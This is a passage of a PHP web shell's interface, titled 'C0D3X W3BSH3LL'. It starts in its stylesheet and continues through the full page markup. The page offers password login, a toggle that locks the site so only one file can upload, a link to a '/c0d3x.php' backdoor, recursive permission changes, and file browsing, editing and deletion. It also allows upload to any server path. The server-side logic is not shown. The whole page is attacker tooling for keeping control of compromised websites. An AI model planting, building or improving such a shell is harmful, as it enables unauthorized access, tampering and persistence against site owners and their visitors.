            font-size: 1.2em;
            width: 24px;
            text-align: center;
        }
        
        .file-name {
            flex: 1;
            font-family: 'SF Mono', monospace;
            font-size: 0.85em;
        }
        
        .file-actions {
            display: flex;
            gap: 6px;
        }
        
        .file-action {
            padding: 6px 10px;
            background: #f5f5f7;
            border: none;
            border-radius: 10px;
            font-size: 0.7em;
            cursor: pointer;
            box-shadow: 3px 3px 6px #e8e8ea, -3px -3px 6px #ffffff;
            color: #1d1d1f;
            border: 1px solid rgba(255,255,255,0.6);
            text-decoration: none;
            display: inline-block;
        }
        
        .input {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 16px;
            background: #f5f5f7;
            box-shadow: inset 6px 6px 12px #e8e8ea, inset -6px -6px 12px #ffffff;
            font-size: 0.9em;
            color: #1d1d1f;
            margin-bottom: 14px;
            font-family: 'SF Mono', monospace;
        }
        
        .mode-buttons {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 16px 0;
        }
        
        .mode-btn {
            padding: 10px;
            background: #f5f5f7;
            border: none;
            border-radius: 12px;
            font-family: 'SF Mono', monospace;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 4px 4px 8px #e8e8ea, -4px -4px 8px #ffffff;
        }
        
        .status {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid rgba(0,0,0,0.08);
            font-size: 0.75em;
            color: #6e6e73;
        }
        
        .key-display {
            background: #f5f5f7;
            border-radius: 16px;
            padding: 18px;
            margin: 16px 0;
            font-family: 'SF Mono', monospace;
            font-size: 0.8em;
            word-break: break-all;
            box-shadow: inset 6px 6px 12px #e8e8ea, inset -6px -6px 12px #ffffff;
        }
        
        .shadow-status {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin-top: 8px;
        }
        
        .shadow-item {
            padding: 8px;
            background: #f5f5f7;
            border-radius: 8px;
            box-shadow: inset 2px 2px 4px #e8e8ea, inset -2px -2px 4px #ffffff;
            font-size: 0.75em;
            text-align: center;
        }
        
        .path-display {
            background: #f5f5f7;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 16px;
            font-family: 'SF Mono', monospace;
            font-size: 0.85em;
            box-shadow: inset 4px 4px 8px #e8e8ea, inset -4px -4px 8px #ffffff;
            word-break: break-all;
        }
        
        .clickable {
            color: #1d1d1f;
            text-decoration: none;
            cursor: pointer;
            font-weight: 500;
            border-bottom: 1px solid #8e8e93;
        }
        
        /* Path input specific styling */
        .path-input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .path-input {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 16px;
            background: #f5f5f7;
            box-shadow: inset 4px 4px 8px #e8e8ea, inset -4px -4px 8px #ffffff;
            font-family: 'SF Mono', monospace;
            font-size: 0.9em;
        }
        
        .path-hint {
            font-size: 0.75em;
            color: #6e6e73;
            margin-top: 5px;
            padding-left: 5px;
        }
        
        @media (max-width: 480px) {
            .button-row { flex-direction: column; }
            .btn { width: 100%; }
            .mode-buttons { grid-template-columns: repeat(2, 1fr); }
            .shadow-status { grid-template-columns: repeat(2, 1fr); }
        }
    </style>
</head>
<body>
    <?php if ($toast_message): ?>
        <div class="toast" id="toastMessage">
            <?php echo nl2br(htmlspecialchars($toast_message)); ?>
        </div>
        <script>
            setTimeout(function() {
                var toast = document.getElementById('toastMessage');
                if (toast) {
                    toast.style.animation = 'slideOut 0.3s ease-in';
                    setTimeout(function() { if (toast) toast.style.display = 'none'; }, 280);
                }
            }, 8000);
        </script>
    <?php endif; ?>
    
    <div class="container">
        <div class="header">
            <div class="title">C0D3X W3BSH3LL</div>
            <div class="subtitle">UNAUTHORIZED ACCESS DENIED</div>
        </div>
        
        <?php if (!$logged_in): ?>
            <div class="section">
                <?php if ($login_error): ?>
                    <div style="color:#1d1d1f; text-align:center; margin-bottom:16px;"><?php echo htmlspecialchars($login_error); ?></div>
                <?php endif; ?>
                
                <?php if ($key_display): ?>
                    <div class="key-display">
                        🔑 SECURITY KEY:<br>
                        <strong><?php echo htmlspecialchars($key_display); ?></strong>
                    </div>
                <?php endif; ?>
                
                <form method="POST" action="">
                    <input type="password" name="password" class="input" placeholder="Enter Password" required autocomplete="off">
                    <div class="button-row">
                        <button type="submit" name="get_key" class="btn">GET KEY</button>
                        <button type="submit" name="login" class="btn">LOGIN</button>
                    </div>
                </form>
            </div>
        <?php else: ?>
            <div class="protection-info">
                <?php if ($protection_active): ?>
                    <div class="protection-domain">🛡️ PROTECTION ACTIVE</div>
                    <div class="immutable-notice">
                        <strong>✅ ONLY abouts.php CAN UPLOAD</strong><br>
                        • 🔥 WAF + PHP HARDENING ACTIVE<br>
                        • 📋 SHADOW COPIES READY<br>
                        • 🚪 BACKDOOR: <span class="clickable" onclick="window.location.href='/c0d3x.php'">/c0d3x.php</span>
                    </div>
                <?php else: ?>
                    <div style="color:#1d1d1f; font-weight:700;">⚠️ PROTECTION INACTIVE</div>
                    <div style="font-size:0.8em; color:#6e6e73; margin-top:8px;">Site is clean - no .htaccess file</div>
                <?php endif; ?>
            </div>
            
            <div class="button-row">
                <a href="?toggle_protection=1" class="btn" id="toggleBtn"><?php echo $protection_active ? '⚠️ DEACTIVATE PROTECTION' : '🛡️ ACTIVATE PROTECTION'; ?></a>
                <a href="?scan=1" class="btn">🔍 SCAN</a>
                <a href="?logout=true" class="btn">🚪 LOGOUT</a>
            </div>
            
            <?php if ($protection_active): ?>
            <div class="section">
                <div style="font-size:0.9em; margin-bottom:8px; font-weight:600;">📋 SHADOW COPIES:</div>
                <div class="shadow-status">
                    <?php foreach ($shadow_status as $file => $status): ?>
                        <div class="shadow-item"><strong><?php echo $file; ?>:</strong> <?php echo $status; ?></div>
                    <?php endforeach; ?>
                </div>
            </div>
            <?php endif; ?>
            
            <?php if ($scan_results && !empty($scan_results['backdoors'])): ?>
            <div class="section">
                <div style="font-size:0.9em; margin-bottom:8px; font-weight:600;">🔍 SCAN RESULTS:</div>
                <div style="font-family:monospace; font-size:0.75em; max-height:200px; overflow-y:auto;">
                    <div><strong>BACKDOORS FOUND:</strong> <?php echo count($scan_results['backdoors']); ?></div>
                </div>
            </div>
            <?php endif; ?>
            
            <div class="section">
                <div style="font-size:0.9em; margin-bottom:8px; font-weight:600;">🔒 PERMISSION TOOLS:</div>
                <form method="POST" action="" style="margin-bottom:10px;">
                    <div style="display:flex; gap:10px;">
                        <input type="text" name="recursive_readonly_path" class="input" value="<?php echo htmlspecialchars($current_path); ?>" style="flex:1; margin-bottom:0;">
                        <button type="submit" name="recursive_readonly_submit" class="btn" style="width:auto;">MAKE 555/444</button>
                    </div>
                </form>
                <form method="POST" action="">
                    <div style="display:flex; gap:10px;">
                        <input type="text" name="recursive_normal_path" class="input" value="<?php echo htmlspecialchars($current_path); ?>" style="flex:1; margin-bottom:0;">
                        <button type="submit" name="recursive_normal_submit" class="btn" style="width:auto;">RESTORE 755/644</button>
                    </div>
                </form>
            </div>
            
            <div class="section">
                <div class="button-row">
                    <button onclick="showUpload()" class="btn">📤 UPLOAD</button>
                    <a href="?refresh=1" class="btn">🔄 REFRESH</a>
                </div>
                
                <div class="path-display">
                    <?php
                    $parts = explode('/', $current_path);
                    $breadcrumb = '';
                    foreach ($parts as $i => $part) {
                        if ($part === '') continue;
                        $breadcrumb .= '/' . $part;
                        echo '<span class="clickable" onclick="gotoPath(\'' . htmlspecialchars($breadcrumb) . '\')">' . htmlspecialchars($part) . '</span>';
                        if ($i < count($parts) - 1) echo ' / ';
                    }
                    ?>
                </div>
                
                <div class="file-list">
                    <?php
                    if (is_dir($current_path)) {
                        $files = filteredScandir($current_path);
                        if ($files) {
                            if ($current_path !== $document_root) {
                                echo '<div class="file-item"><div class="file-icon">📁</div><div class="file-name"><span class="clickable" onclick="gotoPath(\'' . htmlspecialchars(dirname($current_path)) . '\')">..</span></div></div>';
                            }
                            
                            foreach ($files as $file) {
                                $file_path = $current_path . '/' . $file;
                                $is_dir = is_dir($file_path);
                                $perms = substr(sprintf('%o', fileperms($file_path)), -4);
                                ?>
                                <div class="file-item">
                                    <div class="file-icon"><?php echo $is_dir ? '📁' : '📄'; ?></div>
                                    <div class="file-name">
                                        <?php if ($is_dir): ?>
                                            <span class="clickable" onclick="gotoPath('<?php echo htmlspecialchars($file_path); ?>')"><?php echo htmlspecialchars($file); ?></span>
                                        <?php else: ?>
                                            <?php echo htmlspecialchars($file); ?>
                                        <?php endif; ?>
                                        <div style="font-size:0.7em; color:#6e6e73;"><?php echo $perms; ?></div>
                                    </div>
                                    <div class="file-actions">
                                        <?php if (!$is_dir): ?>
                                            <a href="?edit_file=<?php echo urlencode($file_path); ?>" class="file-action">Edit</a>
                                            <a href="?delete=<?php echo urlencode($file_path); ?>" class="file-action" onclick="return confirm('Delete this file?')">Del</a>
                                        <?php else: ?>
                                            <a href="?delete=<?php echo urlencode($file_path); ?>" class="file-action" onclick="return confirm('Delete this directory?')">Del</a>
                                        <?php endif; ?>
                                    </div>
                                </div>
                                <?php
                            }
                        }
                    }
                    ?>
                </div>
            </div>
            
            <div class="section" id="uploadForm" style="display: none;">
                <form method="POST" action="" enctype="multipart/form-data">
                    <div style="margin-bottom:15px;">
                        <div style="font-size:0.9em; margin-bottom:5px; font-weight:600;">📁 UPLOAD PATH:</div>
                        <input type="text" name="upload_path" class="input" value="<?php echo htmlspecialchars($current_path); ?>" placeholder="Enter full path (e.g., /home/username/public_html or C:\xampp\htdocs)">
                        <div class="path-hint">💡 You can upload to ANY path on the server</div>
                    </div>
                    
                    <div style="margin-bottom:15px;">
                        <div style="font-size:0.9em; margin-bottom:5px; font-weight:600;">📄 SELECT FILE:</div>
                        <input type="file" name="upload_file" class="input" required>
                    </div>
                    
                    <div class="button-row">
                        <button type="button" onclick="hideUpload()" class="btn">CANCEL</button>
                        <button type="submit" class="btn">UPLOAD</button>
                    </div>
                </form>
            </div>
            
            <?php if (isset($_GET['edit']) && isset($_SESSION['edit_file'])): ?>
                <div class="section">
                    <form method="POST" action="">
                        <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($_SESSION['edit_file']); ?>">
                        <textarea name="file_content" class="input" rows="15" style="font-family:monospace;"><?php echo isset($_SESSION['edit_content']) ? htmlspecialchars($_SESSION['edit_content']) : ''; unset($_SESSION['edit_file'], $_SESSION['edit_content']); ?></textarea>
                        <div class="button-row">
                            <button type="button" onclick="window.location.href=window.location.pathname" class="btn">CANCEL</button>
                            <button type="submit" name="save_file" class="btn">SAVE</button>
                        </div>
                    </form>
                </div>
            <?php endif; ?>
            
            <div class="status">
                <div>Path: <?php echo htmlspecialchars(basename($current_path)); ?></div>
                <div>UPLOAD: <?php echo $upload_allowed ? 'ALLOWED' : 'BLOCKED'; ?></div>
                <?php if ($protection_active): ?>
                <div>SHADOW: <?php echo count($shadow_status); ?> FILES</div>
                <?php else: ?>
                <div>CLEAN: NO .HTACCESS</div>
                <?php endif; ?>
            </div>
        <?php endif; ?>
    </div>

    <script>
        function gotoPath(path) { window.location.href = '?goto_path=' + encodeURIComponent(path); }
        function showUpload() { document.getElementById('uploadForm').style.display = 'block'; }
        function hideUpload() { document.getElementById('uploadForm').style.display = 'none'; }
    </script>
</body>
</html>
